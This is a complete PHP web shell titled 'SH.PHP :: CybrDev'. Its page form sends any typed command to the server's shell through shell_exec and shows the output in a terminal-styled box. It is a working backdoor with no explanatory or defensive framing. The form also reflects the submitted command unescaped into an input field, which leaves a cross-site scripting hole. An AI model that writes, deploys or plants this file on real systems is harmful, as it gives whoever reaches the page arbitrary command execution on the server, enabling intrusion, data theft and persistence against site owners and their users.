<?php
if (!empty($_POST['cmd'])) {
    $cmd = shell_exec(htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8'));
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>SH.PHP :: CybrDev</title>
    <style>
        h1, h2 {
            text-align:center;
            color: #666;
        }
        pre {
            padding: 15px;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            border-radius: 5px;
            background-color: #333333;
            color: #31E021;
        }
        .command-form{
           text-align: center;
        }
        input{
            width: 840px;
            height: 40px;
            font-size: 2em;
        }
        .button{
            text-align:center;
            margin:auto;
        }
        .button>button{
            height: 50px;
        }
    </style>
</head>
<body>
    <div class="container">
        <form method="POST">
            <div class="command-form">
            <br>
                <label for="cmd"><strong>Type your command here:</strong></label>
                <br>
                <input type="text" name="cmd" id="cmd" value="<?php if(isset($cmd)) echo $_POST['cmd']; ?>" required autocomplete="OFF">
            </div>
            <div class="button">
            <button type="submit">Execute</button>
            </div>
        </form>
<?php if(isset($cmd)) if ($cmd): ?>
        <div>
            <h2> Output </h2>
        </div>
        <pre>
<?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
        </pre>
<?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'): ?>
        <div>
            <h2>Output</h2>
        </div>
        <pre><small>Nothing.</small></pre>
<?php endif; ?>
    </div>
</body>
</html>
